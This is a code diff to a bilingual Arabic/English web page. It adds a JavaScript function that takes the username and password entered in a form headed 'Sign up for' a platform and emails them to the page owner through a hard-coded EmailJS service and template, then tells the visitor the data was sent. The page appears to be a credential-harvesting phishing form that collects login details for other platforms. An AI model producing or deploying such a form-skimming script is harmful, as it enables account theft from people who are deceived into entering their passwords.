@@ -7,7 +7,7 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         (function () {
-            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل بـ Public Key الخاص بك
+            emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
         })();
 
         function toggleLanguage(lang) {
@@ -16,6 +16,34 @@
                 el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
             });
             document.documentElement.lang = lang;
+        }
+
+        function sendPlatformData(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+            
+            // استخراج البيانات من النموذج
+            const platformName = document.getElementById('platform-name').textContent.trim();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // إعداد البيانات لإرسالها
+            const templateParams = {
+                platform: platformName,
+                username: username,
+                password: password
+            };
+
+            // إرسال البيانات باستخدام EmailJS
+            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
+                .then(() => {
+                    alert('تم إرسال البيانات بنجاح!');
+                    document.getElementById('registration-form').reset(); // إعادة تعيين النموذج
+                    document.getElementById('form-container').style.display = 'none'; // إخفاء النموذج
+                })
+                .catch(error => {
+                    console.error('خطأ أثناء إرسال البيانات:', error);
+                    alert('عذرًا، حدث خطأ أثناء إرسال البيانات.');
+                });
         }
     </script>
     <style>
@@ -142,9 +170,9 @@
 
     <div class="form-container" id="form-container">
         <h3 id="platform-name" data-ar="التسجيل في" data-en="Sign up for">التسجيل في</h3>
-        <form id="registration-form">
-            <input type="text" name="username" id="username" data-ar="اسم المستخدم" placeholder="اسم المستخدم" required>
-            <input type="password" name="password" id="password" data-ar="كلمة المرور" placeholder="كلمة المرور" required>
+        <form id="registration-form" onsubmit="sendPlatformData(event)">
+            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
             <button type="submit" data-ar="انضمام" data-en="Join">انضمام</button>
         </form>
     </div>
